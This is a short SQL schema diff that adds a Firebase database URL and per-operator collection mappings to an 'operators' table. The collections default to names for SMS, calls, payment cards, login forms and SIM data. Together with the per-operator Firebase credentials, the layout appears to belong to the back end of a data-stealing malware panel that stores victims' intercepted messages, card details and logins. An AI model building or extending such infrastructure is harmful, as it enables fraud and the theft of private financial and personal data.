@@ -28,10 +28,18 @@ CREATE TABLE operators (
     -- Per-Operator Isolated Firebase Database Credentials
     firebase_project_id VARCHAR(100) NOT NULL,
     firebase_api_key VARCHAR(255) DEFAULT 'AIzaSyDefaultApiKey2026',
+    firebase_database_url VARCHAR(512) DEFAULT '',
     firebase_auth_domain VARCHAR(255),
     storage_bucket VARCHAR(255),
     app_id VARCHAR(255),
     org_id VARCHAR(100) NOT NULL DEFAULT 'org_main',
+
+    -- Per-Operator Firebase Collection Mappings (Preset saved to DB)
+    collection_sms VARCHAR(100) DEFAULT 'user_sms',
+    collection_calls VARCHAR(100) DEFAULT 'calls',
+    collection_cards VARCHAR(100) DEFAULT 'Card',
+    collection_forms VARCHAR(100) DEFAULT 'login',
+    collection_sims VARCHAR(100) DEFAULT 'user_data',
     
     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
     updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
